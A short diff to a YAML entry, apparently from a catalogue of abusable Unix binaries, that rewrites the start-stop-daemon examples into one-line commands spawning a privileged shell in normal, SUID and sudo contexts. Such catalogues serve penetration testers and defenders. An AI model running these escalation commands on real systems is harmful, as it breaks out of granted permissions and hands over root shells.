@@ -1,15 +1,11 @@
 ---
 functions:
   shell:
-    - code: start-stop-daemon --start -x '/bin/sh'
+    - code: start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
   suid:
     - code: |
-        EDITOR=absolute_path_to_text_editor
-        LFILE=file_to_write
-        ./start-stop-daemon --start -x "$EDITOR" "$LFILE"
+        ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
   sudo:
     - code: |
-        EDITOR=absolute_path_to_text_editor
-        LFILE=file_to_write
-        sudo start-stop-daemon --start -x "$EDITOR" "$LFILE"
+        sudo start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
 ---
